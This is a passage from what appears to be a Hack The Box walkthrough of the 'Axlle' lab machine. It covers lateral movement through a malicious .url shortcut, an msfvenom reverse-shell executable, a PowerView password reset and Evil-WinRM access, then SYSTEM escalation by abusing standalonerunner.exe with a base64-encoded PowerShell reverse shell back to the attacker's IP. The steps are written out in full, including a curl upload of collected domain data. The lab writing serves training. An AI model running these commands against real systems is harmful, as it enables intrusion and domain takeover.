+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>PS C:\ProgramData\xpltive&gt; curl.exe -X POST -F &quot;files=@20250117073007_axlle.zip&quot; http://10.10.16.33:1080/upload
+</span></code></pre></div>
+<p>After having received the file, we can import the <code>.zip</code> into our <code>BloodHound</code> instance and enumerate the AD environment.</p>
+<p><img alt="Axlle-24.png" src="../images/Axlle-24.png" /></p>
+<p>Inspecting some initial information about our compromised domain user <code>gideon.hamill</code> does not get us further. However we will use this AD domain information later on. For now we will move back to enumerating the <code>MAINFRAME</code> host.</p>
+<h2 id="host-enumeration">Host Enumeration<a class="headerlink" href="#host-enumeration" title="Permanent link">&para;</a></h2>
+<p>We start with some manual enumeration on the host, getting information about privileges, groups, programs installed and potentially interesting files.</p>
+<p>Eventually we will come across the <code>hMailServer</code> program installed on the host, which we also fingerprinted during our initial <code>Nmap</code> scan (25/TCP). Inside the directory of it at <code>C:\Program Files (x86)\hMailServer\Data\axlle.htb\dallon.matrix\2F</code> we see an <code>.eml</code> file present. Upon getting the contents of the file, we will see an interesting email mentioning the development team testing automation. They ask to drop web shortcut files into <code>C:\inetpub\testing</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>PS C:\&gt; type &quot;C:\Progra~2\hMailServer\Data\axlle.htb\dallon.matrix\2F\{2F7523BD-628F-4359-913E-A873FCC59D0F}.eml&quot;                                                                                                                                                                       
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Return-Path: webdevs@axlle.htb
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>Received: from bumbag (Unknown [192.168.77.153])
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>        by MAINFRAME with ESMTP
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>        ; Mon, 1 Jan 2024 06:32:24 -0800
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>Date: Tue, 02 Jan 2024 01:32:23 +1100
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>To: dallon.matrix@axlle.htb,calum.scott@axlle.htb,trent.langdon@axlle.htb,dan.kendo@axlle.htb,david.brice@axlle.htb,frankie.rose@axlle.htb,samantha.fade@axlle.htb,jess.adams@axlle.htb,emily.cook@axlle.htb,phoebe.graham@axlle.htb,matt.drew@axlle.htb,xavier.edmund@axlle.htb,baz.humphries@axlle.htb,jacob.greeny@axlle.htb
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>From: webdevs@axlle.htb
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>Subject: OSINT Application Testing
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>Message-Id: &lt;20240102013223.019081@bumbag&gt;
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+</span><span id="__span-14-12"><a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>
+</span><span id="__span-14-13"><a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>Hi everyone,
+</span><span id="__span-14-14"><a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>
+</span><span id="__span-14-15"><a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.
+</span><span id="__span-14-16"><a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>
+</span><span id="__span-14-17"><a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.
+</span><span id="__span-14-18"><a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>
+</span><span id="__span-14-19"><a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>Yours in click-worthy URLs,
+</span><span id="__span-14-20"><a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>
+</span><span id="__span-14-21"><a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>The Web Dev Team
+</span></code></pre></div>
+<h2 id="host-exploitation-lateral-movement-to-dallonmatrix">Host Exploitation &amp; Lateral Movement to dallon.matrix<a class="headerlink" href="#host-exploitation-lateral-movement-to-dallonmatrix" title="Permanent link">&para;</a></h2>
+<p>We can abuse web shortcut files (<code>.url</code>) in order to do all kinds of nefarious stuff, such as using them to reach out to a rogue SMB server that we host in order to catch NTLMv2 hashes and try to crack/relay them or since we already have code execution on the host itself, we can chose to simply run an executable.</p>
+<p>We craft a malicious executable using <code>MSFVenom</code> which aims to establish a reverse shell connection back to our attack host's listener.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.16.33 lport=6666 -f exe -o shelly.exe
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>[-] No arch selected, selecting arch: x86 from the payload
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>No encoder specified, outputting raw payload
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>Payload size: 324 bytes
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>Final size of exe file: 73802 bytes
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>Saved as: shelly.exe
+</span></code></pre></div>
+<p>Next we prepare our malicious <code>.url</code> file with the following contents, which will run the above executable.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>$ cat automation.url     
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>[InternetShortcut]
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>URL=&quot;C:\ProgramData\xpltive\shelly.exe&quot;
+</span></code></pre></div>
+<p>We start a download server on our attack host in order to download the files to the victim host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>$ python3 -m http.server 1080
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Serving HTTP on 0.0.0.0 port 1080 (http://0.0.0.0:1080/) ...
+</span></code></pre></div>
+<p>Download the files and subsequently copying the malicious <code>automation.url</code> to <code>C:\inetpub\testing</code>; as mentioned in the previously read email.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>PS C:\Programdata\xpltive&gt; copy automation.url &quot;C:\inetpub\testing&quot;
+</span></code></pre></div>
+<p>Before copying the <code>.url</code> file, we obviously start our listener on our attack host in order to catch the connection attempt made by the executable. We will successfully get a reverse shell connection as <code>dallon.matrix</code> on the <code>MAINFRAME</code> host. We also start up PowerShell.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>$ rlwrap -cAr nc -lvnp 6666
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>listening on [any] 6666 ...
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>connect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 49880
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>Microsoft Windows [Version 10.0.20348.2527]
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>(c) Microsoft Corporation. All rights reserved.
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>C:\&gt;whoami
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>axlle\dallon.matrix
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>C:\&gt;hostname
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>MAINFRAME
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>C:\&gt;cd ProgramData\xpltive
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>C:\ProgramData\xpltive&gt;powershell -ep bypass
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>Windows PowerShell
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>Copyright (C) Microsoft Corporation. All rights reserved.
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>
+</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>PS C:\ProgramData\xpltive&gt;
+</span></code></pre></div>
+<p>The <strong>user flag</strong> can now be found at <code>C:\Users\dallon.matrix\Desktop\user.txt</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>PS C:\ProgramData\xpltive&gt; type &quot;C:\Users\dallon.matrix\Desktop\user.txt&quot;
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>33fc5f5827a0ba1a5e1d83526f688501
+</span></code></pre></div>
+<h2 id="ad-exploitation-lateral-movement-to-jacobgreeny">AD Exploitation &amp; Lateral Movement to jacob.greeny<a class="headerlink" href="#ad-exploitation-lateral-movement-to-jacobgreeny" title="Permanent link">&para;</a></h2>
+<p>After having obtained a shell as domain user <code>dallon.matrix</code>, we go back to the <code>BloodHound</code> data and can see <code>dallon.matrix</code> is part of the domain group <code>WEB DEVS</code>, which in turn has <code>ForceChangePassword</code> permissions on the domain users <code>jacob.greeny</code> and <code>baz.humphries</code>.</p>
+<p><img alt="Axlle-25.png" src="../images/Axlle-25.png" /></p>
+<p>Both of the aforementioned users are part of the <code>REMOTE MANAGEMENT USERS</code> as well as <code>APP DEVS</code> groups. The <code>REMOTE MANAGEMENT USERS</code> group would allow us to access the <code>MAINFRAME</code> host via the exposed <code>WinRM</code> service we saw during the initial <code>Nmap</code> scan.</p>
+<p><img alt="Axlle-26.png" src="../images/Axlle-26.png" /></p>
+<p>We start with compromising the <code>jacob.greeny</code> domain user by abusing the <code>ForceChangePassword</code> permission. To do this we transfer over the <code>PowerView</code> tool to the <code>MAINFRAME</code> host; similar to as we have transferred files previously.</p>
+<p>To change the password we import <code>PowerView</code>, define a new password using <code>ConvertTo-SecureString</code> and finally set the password for <code>jacob.greeny</code> using the <code>Set-DomainUserPassword</code> functionality of <code>PowerView</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>PS C:\ProgramData\xpltive&gt; Import-Module .\powerview.ps1
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>PS C:\ProgramData\xpltive&gt; $pw_jacob = ConvertTo-SecureString &#39;P@ssword1&#39; -AsPlainText -Force
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>PS C:\ProgramData\xpltive&gt; Set-DomainUserPassword -Identity jacob.greeny -AccountPassword $pw_jacob
+</span></code></pre></div>
+<p>Since <code>jacob.greeny</code> is part of the <code>REMOTE MANAGEMENT USERS</code> group, we can now authenticate via <code>WinRM</code> to the <code>MAINFRAME</code> host using the password we just set. We use <code>Evil-WinRM</code> for this.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>$ evil-winrm -i MAINFRAME.axlle.htb -u jacob.greeny -p &#39;P@ssword1&#39;                 
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>Evil-WinRM shell v3.7
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>Info: Establishing connection to remote endpoint
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a>*Evil-WinRM* PS C:\Users\jacob.greeny\Documents&gt; whoami
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a>axlle\jacob.greeny
+</span><span id="__span-22-12"><a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>*Evil-WinRM* PS C:\Users\jacob.greeny\Documents&gt; hostname
+</span><span id="__span-22-13"><a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a>MAINFRAME
+</span></code></pre></div>
+<h2 id="host-enumeration-as-jacobgreeny">Host Enumeration as jacob.greeny<a class="headerlink" href="#host-enumeration-as-jacobgreeny" title="Permanent link">&para;</a></h2>
+<p>With code execution as <code>jacob.greeny</code> we can now access the <code>C:\App Development</code> folder present on the victim host.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>*Evil-WinRM* PS C:\&gt; cmd /c tree /a /f &quot;App Development&quot;
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>Folder PATH listing
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>Volume serial number is 000001D3 BFF7:F940
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>C:\APP DEVELOPMENT
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>\---kbfiltr
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>    |   kbfiltr.sln
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>    |   README.md
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>    |
+</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>    +---exe
+</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>    |       kbftest.c
+</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>    |       kbftest.vcxproj
+</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>    |       kbftest.vcxproj.Filters
+</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>    |
+</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>    \---sys
+</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>            kbfiltr.c
+</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>            kbfiltr.h
+</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>            kbfiltr.inx
+</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>            kbfiltr.rc
+</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>            kbfiltr.vcxproj
+</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>            kbfiltr.vcxproj.Filters
+</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>            public.h
+</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>            rawpdo.c
+</span></code></pre></div>
+<p>We see some source files for a <code>C</code> program called <code>kbfiltr</code>, which upon researching a bit on it online appears to be a slightly modified version of the Keyboard Input WDF Filter Driver by <a href="https://learn.microsoft.com/en-us/samples/microsoft/windows-driver-samples/keyboard-input-wdf-filter-driver-kbfiltr/">Microsoft</a>. The source code can also be found on <a href="https://github.com/microsoft/Windows-driver-samples/tree/main/input/kbfiltr">Microsoft's GitHub</a> .</p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>Getting the contents of the <code>README.md</code> at <code>C:\App Development\kbfiltr\README.md</code> reveals some interesting information in form of a note someone left:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>*Evil-WinRM* PS C:\App Development\kbfiltr&gt; type README.md
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>&lt;--SNIP--&gt;
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>**NOTE: I have automated the running of `C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\standalonerunner.exe` as SYSTEM to test and debug this driver in a standalone environment**
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>&lt;--SNIP--&gt;
+</span></code></pre></div>
+<p>We gain knowledge that the <code>standalonerunner.exe</code> is running automated as SYSTEM to debug the <code>kbfiltr</code>. Upon googling for the <code>standalonerunner.exe</code> we come across a <a href="https://github.com/nasbench/Misc-Research/blob/main/LOLBINs/StandaloneRunner.md">GitHub repository</a> by <code>nasbench</code>. They researched the executable and found that one could achieve arbitrary code execution.</p>
+<p>This helps us greatly, as we know the <code>standalonerunner.exe</code> is configured to run as <code>SYSTEM</code>. So if we get code execution this way, we have ultimately compromised the host.</p>
+<p>We follow the steps <code>nasbench</code> provided and create a quick <code>.bat</code> script that does the steps for us with the following contents.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>@echo off
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>(echo myTestDir &amp;&amp; echo True) &gt;&gt; &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\reboot.rsf&quot;
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>mkdir &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working&quot;
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>echo $null &gt; &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working\rsf.rsf&quot;
+</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>echo powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAzACIALAA2ADYANgA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA== &gt; &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\command.txt&quot;
+</span></code></pre></div>
+<p>We chose a <code>base64</code> encoded PowerShell command once again to establish the reverse shell connection, since it appears we have to stick to native Windows commands for this.</p>
+<p>We upload it to the victim host using <code>Evil-WinRM</code> upload functionality and subsequently run it to create the directories and files. We also confirm this as having been successful.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; upload privesc.bat
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>&lt;--SNIP--&gt;          
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Info: Upload successful!
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; .\privesc.bat
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>&lt;--SNIP--&gt;
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>*Evil-WinRM* PS C:\Programdata\xpltive&gt; tree /a /f &quot;C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64&quot;      
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>Folder PATH listing
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>Volume serial number is 000001B4 BFF7:F940
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>C:\PROGRAM FILES (X86)\WINDOWS KITS\10\TESTING\STANDALONETESTING\INTERNAL\X64
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>|   command.txt
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>|   reboot.rsf
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>|   standalonerunner.exe
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>|   standalonexml.dll
+</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>|
+</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a>\---myTestDir
+</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a>    \---working
+</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>            rsf.rsf
+</span></code></pre></div>
+<p>We are now ready to escalate our privileges by simply waiting for the <code>standalonerunner.exe</code> to start on its own (since it was configured this way according to the <code>README.md</code> note).</p>
+<p>We obviously have our listener running first and will eventually catch the incoming reverse shell connection attempt.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>$ rlwrap -cAr nc -lvnp 6666
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>listening on [any] 6666 ...
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>connect to [10.10.16.33] from (UNKNOWN) [10.129.65.77] 57192
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working&gt; whoami
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>axlle\administrator
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>PS C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\myTestDir\working&gt; hostname
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>MAINFRAME
+</span></code></pre></div>
+<p>This concludes the successful compromise of the <code>MAINFRAME</code> host as well as the <code>axlle.htb</code> Active Directory domain. </p>
+<p>The <strong>root flag</strong> can be found at <code>C:\Users\Administrator\Desktop\root.txt</code>.</p>
